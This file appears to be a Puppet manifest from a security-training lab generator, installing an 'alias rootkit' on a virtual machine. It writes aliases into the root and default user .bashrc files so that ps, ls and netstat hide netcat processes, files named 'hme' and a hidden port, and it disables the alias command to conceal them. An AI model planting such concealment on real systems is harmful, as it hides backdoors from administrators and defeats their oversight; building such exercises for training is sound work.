class alias_rootkit::install {

  $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
  $hidden_port = $secgen_parameters['hidden_port'][0]

  $aliases = "alias ps='f(){ ps \"$@\" |grep -v 'hme\|nc\|$hidden_port'; unset -f f; }; f'; alias ls='f(){ ls \"$@\" |grep -v hme |column -c 80; unset -f f; }; f'; alias netstat='f(){ netstat \"$@\" |grep -v '44\|hme\|nc\|$hidden_port'; unset -f f; }; f'; alias alias='true'"

  file_line { 'Append a line to /etc/skel/.bashrc':
    path => '/etc/skel/.bashrc',
    line => $aliases,
  }
  file_line { 'Append a line to /root/.bashrc':
    path => '/root/.bashrc',
    line => $aliases,
  }

}
